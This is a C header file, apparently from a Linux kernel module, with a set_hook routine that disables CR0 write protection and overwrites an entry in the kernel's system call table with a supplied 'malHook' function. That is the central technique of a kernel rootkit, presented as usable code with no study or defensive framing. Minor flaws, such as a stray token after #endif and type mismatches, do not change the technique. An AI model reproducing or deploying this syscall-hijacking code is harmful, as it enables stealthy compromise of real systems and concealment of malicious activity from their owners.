
#include "hardware.h"

#ifndef HOOKS_H
#define HOOKS_H

static struct hookInfo
{
    unsigned short      processor;      /* the current processor number on which the hook is executes */ 
    void**              sstb;           /* syscall base address */ 
    unsigned int        nr;             /* syscall number __NR_* */ 
    unsigned long       hookFunc;       /* our hook address */ 
    unsigned long       originalFunc;   /* original hook address */

}; 

/* stores hook related information */ 
static struct hookInfo hi; 

/* original system call handler */ 
inline void set_hook(unsigned long malHook, unsigned int sysNumber)
{
    hi.sstb = syscall_table_base();             /* syscall table base address */ 
    hi.processor = smp_processor_id();          /* executing processor */ 
    hi.originalFunc = hi.sstb[sysNumber];       /* extracting the target syscall */ 
    hi.hookFunc = malHook;                      /* hook address */ 
    hi.nr = sysNumber;                          /* system call number */

    printk(KERN_INFO  "[*] Hooking system call number [%d]\n", hi.nr); 
    printk(KERN_INFO  "[*] Executing on [%d] cpu\n", hi.processor);
    printk(KERN_INFO  "[*] Syscall table base address 0x%lx\n", hi.sstb); 
    printk(KERN_INFO  "[*] Original function address 0x%lx\n", hi.originalFunc);

    wpOFF();                        /* masking CR0 wp flag */ 
    hi.sstb[hi.nr] = malHook;       /* overwriting entry in the system call table */ 
    wpON();                         /* wp on */ 

}



#endif HOOKS_H
